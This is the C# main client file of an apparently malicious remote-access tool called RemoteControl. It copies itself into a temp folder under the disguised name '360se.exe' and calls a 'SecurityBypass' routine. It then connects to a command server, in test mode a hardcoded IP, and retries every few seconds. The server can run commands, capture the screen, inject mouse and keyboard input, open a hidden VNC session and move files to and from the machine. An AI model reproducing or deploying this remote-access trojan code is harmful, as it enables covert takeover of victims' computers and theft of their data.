using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading;
using RemoteControl.Protocals;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;
using System.Net;
using System.Runtime.InteropServices;
using RemoteControl.Protocals.Response;
using RemoteControl.Client.Handlers;
using RemoteControl.Client.Utils;
using RemoteControl.Protocals.Codec;

namespace RemoteControl.Client
{
    class Program
    {
        private static Socket oServer;
        private static bool isTestMode = false;
        private static bool isClosing = false;
        private static Thread heartbeatThread = null;

        static Program()
        {
            AssemblyLoader.Register("Newtonsoft.Json.Lite", "RemoteControl.Client.Loaders.Newtonsoft.Json.Lite.dll.zip");
            AssemblyLoader.Register("RemoteControl.Protocals", "RemoteControl.Client.Loaders.RemoteControl.Protocals.dll.zip");
            AssemblyLoader.Attach();
        }

        static void Main(string[] args)
        {
            if (args.Length == 1 && args[0].StartsWith("/delay:"))
            {
                string str = args[0].Substring("/delay:".Length);
                int delay = Convert.ToInt32(str);
                Thread.Sleep(delay);
                args = new string[]{};
            }
            if (args.Length == 0)
            {
                // 进行安装操作
                string sourceFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                var destinationFileDir = Environment.GetEnvironmentVariable("temp") + "\\" + Guid.NewGuid().ToString();
                if (!System.IO.Directory.Exists(destinationFileDir))
                {
                    System.IO.Directory.CreateDirectory(destinationFileDir);
                }
                string serviceName = "360se.exe";
                var paras = ReadParameters();
                if (!string.IsNullOrWhiteSpace(paras.ServiceName))
                {
                    serviceName = paras.ServiceName;
                }
                var destinationFilePath = destinationFileDir + "\\" + serviceName;
                System.IO.File.Copy(sourceFilePath, destinationFilePath, true);
                var t = ProcessUtil.Run(destinationFilePath, "/r", true, false);
                t.Join();
                return;
            }
            else if (args.Length == 1)
            {
                if (args[0] == "/r")
                {
                    RemoteControl.Client.Utils.SecurityBypass.Execute();
                    InitHandlers();
                    StartConnect();
                    heartbeatThread = new Thread(() => StartHeartbeat()) {IsBackground = true};
                    heartbeatThread.Start();
                    StartMonitor();
                }
            }
        }

        static Dictionary<ePacketType, IRequestHandler> InitHandlers()
        {
            var handlers = new Dictionary<ePacketType, IRequestHandler>();
            RequestGetDrivesHandler getDrivesHandler = new RequestGetDrivesHandler();
            handlers.Add(ePacketType.PACKET_GET_DRIVES_REQUEST, getDrivesHandler);
            handlers.Add(ePacketType.PACKET_GET_DRIVES_EX_REQUEST, getDrivesHandler);
            handlers.Add(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, new RequestGetSubFilesOrDirsHandler());
            handlers.Add(ePacketType.PACKET_COMMAND_REQUEST, new RequestCommandHandler());
            RequestCaptureScreenHandler captureScreenHandler = new RequestCaptureScreenHandler();
            handlers.Add(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
            handlers.Add(ePacketType.PACKET_MOUSE_EVENT_REQUEST, new RequestMouseEventHandler());
            handlers.Add(ePacketType.PACKET_KEYBOARD_EVENT_REQUEST, new RequestKeyboardEventHandler());
            RequestHVNCHandler hvncHandler = new RequestHVNCHandler();
            handlers.Add(ePacketType.PACKET_HVNC_START_REQUEST, hvncHandler);
            handlers.Add(ePacketType.PACKET_HVNC_STOP_REQUEST, hvncHandler);
            handlers.Add(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, hvncHandler);
            handlers.Add(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, hvncHandler);
            handlers.Add(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, hvncHandler);
            RequestDownloadHandler downloadHandler = new RequestDownloadHandler();
            handlers.Add(ePacketType.PACKET_START_DOWNLOAD_REQUEST, downloadHandler);
            handlers.Add(ePacketType.PACKET_STOP_DOWNLOAD_REQUEST, downloadHandler);
            handlers.Add(ePacketType.PACKET_OPEN_FILE_REQUEST, new RequestOpenFileHandler());
            RequestUploadHandler uploadHandler = new RequestUploadHandler();
            handlers.Add(ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST, uploadHandler);
            handlers.Add(ePacketType.PACKET_START_UPLOAD_RESPONSE, uploadHandler);
            handlers.Add(ePacketType.PACKET_STOP_UPLOAD_REQUEST, uploadHandler);

            return handlers;
        }

        static ClientParameters ReadParameters()
        {
            ClientParameters paras = new ClientParameters();
            if (isTestMode)
            {
                paras.SetServerIP("203.91.76.159");
                paras.ServerPort = 10010;
                paras.OnlineAvatar = "";
                paras.ServiceName = "";
            }
            else
            {
                string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                paras = ClientParametersManager.ReadParameters(filePath); 
            }
            Console.WriteLine("参数信息：");
            if (!isTestMode)
            {
                Console.WriteLine("IP:" + paras.GetServerIP());
                Console.WriteLine("PORT：" + paras.ServerPort);
            }
            else
            {
                Console.WriteLine("IP: 203.91.76.159 (test mode)");
                Console.WriteLine("PORT: 10010 (test mode)");
            }

            return paras;
        }

        static void StartConnect()
        {
            var paras = ReadParameters();
            var handlers = InitHandlers();
            IPEndPoint ep;
            if (isTestMode)
            {
                ep = new IPEndPoint(IPAddress.Parse("203.91.76.159"), 10010);
            }
            else
            {
                ep = paras.GetIPEndPoint();
            }
            while (true)
            {
                try
                {
                    DoOutput("正在连接服务器...");
                    oServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    oServer.Connect(ep);
                    DoOutput("服务器连接成功！");

                    var oServerSession = new SocketSession(oServer.RemoteEndPoint.ToString(), oServer);

                    var handshake = new RemoteControl.Protocals.Relay.RelayHandshake();
                    handshake.Role = "client";
                    handshake.HostName = Dns.GetHostName();
                    handshake.AppPath = Application.ExecutablePath;
                    handshake.OnlineAvatar = paras.OnlineAvatar;
                    oServerSession.Send(ePacketType.CYCLER_RELAY_HANDSHAKE, handshake);

                    StartRecvData(oServerSession, handlers);
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("连接服务器异常，" + ex.Message);
                }
                Thread.Sleep(3000);
            }
        }

        static void StartRecvData(SocketSession session, Dictionary<ePacketType, IRequestHandler> handlers)
        {
            new Thread(() =>
            {
                byte[] buffer = new byte[1024];
                int recvSize = -1;
                List<byte> data = new List<byte>();
                while (true)
                {
                    try
                    {
                        recvSize = session.SocketObj.Receive(buffer);
                        if (recvSize <= 0)
                            break;

                        for (int i = 0; i < recvSize; i++)
                        {
                            data.Add(buffer[i]);
                        }
                        while (data.Count >= 4)
                        {
                            int packetLength = BitConverter.ToInt32(data.ToArray(), 0);
                            if (data.Count >= packetLength)
                            {
                                DoRecvBytes(session, data.SplitBytes(0, packetLength), handlers);
                                data.RemoveRange(0, packetLength);
                            }
                            else
                            {
                                break;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        break;
                    }
                }
            }) { IsBackground = true }.Start();
        }

        static void DoRecvBytes(SocketSession session, byte[] packet, Dictionary<ePacketType, IRequestHandler> handlers)
        {
            ePacketType packetType;
            object obj;
            CodecFactory.Instance.DecodeObject(packet, out packetType, out obj);
            Console.WriteLine(packetType.ToString());

            if (handlers.ContainsKey(packetType))
            {
                handlers[packetType].Handle(session, packetType, obj);
            }
        }

        static void StartHeartbeat()
        {
            while (true)
            {
                if (isClosing)
                {
                    break;
                }
                try
                {
                    if (oServer != null)
                    {
                        byte[] packet = CodecFactory.Instance.EncodeOject(ePacketType.PACKET_HEART_BEAR, null);
                        oServer.Send(packet);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("心跳发送异常，" + ex.Message);
                    StartConnect();
                }
                Thread.Sleep(3000);
            }

        }

        static void StartMonitor()
        {
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        static void DoOutput(string sMsg)
        {
            Console.WriteLine("{0} {1}", DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"), sMsg);
        }
    }
}
